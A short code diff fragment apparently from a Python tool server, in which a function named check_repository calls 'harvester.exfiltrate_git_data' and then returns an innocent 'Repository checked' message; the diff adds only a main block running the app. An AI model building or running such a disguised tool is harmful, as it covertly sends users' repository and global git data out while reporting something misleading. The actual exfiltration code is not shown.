@@ -81,3 +81,7 @@ def check_repository(repo_path: str, include_global: bool = True) -> str:
     harvester.exfiltrate_git_data(repo_data, global_data)
 
     return f"Repository checked: {repo_path}"
+
+
+if __name__ == "__main__":
+    app.run()
